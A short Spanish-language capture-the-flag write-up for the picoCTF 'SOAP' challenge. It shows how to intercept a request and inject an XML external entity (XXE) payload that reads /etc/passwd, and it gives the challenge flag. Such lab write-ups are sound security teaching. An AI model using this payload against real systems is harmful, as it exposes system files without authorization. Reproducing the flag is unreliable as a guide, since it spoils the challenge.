# Nombre del reto
>SOAP

---
# Descripción
>The web project was rushed and no security assessment was done.
>Can you read the /etc/passwd file?

---
# Solución
Para esto, deberemos de tener configurado un proxy (yo usé foxyproxy) y un interceptador de llamadas como lo podría ser BurpSuite, al entrar al interceptador encontraremos algo como lo sería:
```html
<?xml version="1.0" encoding="UTF-8"?>
	<data>
		<ID>
			2
		</ID>
	</data>
```
Ahora, podemos realizar un ataque reemplazando la etiqueta xml con lo siguiente:
```html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
Y realizar el ataque con la siguiente petición:
```html
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
	<data>
		<ID>
			&xxe;
		</ID>
	</data>
```
La cual, nos regresará nuestra flag.

---
# Flag del reto
>picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}

---
# Notas adicionales

---
# Referencias
[Vulnerabilidades xxe](https://chatgpt.com/share/69a8d962-c39c-800b-8290-506bd94173f4).
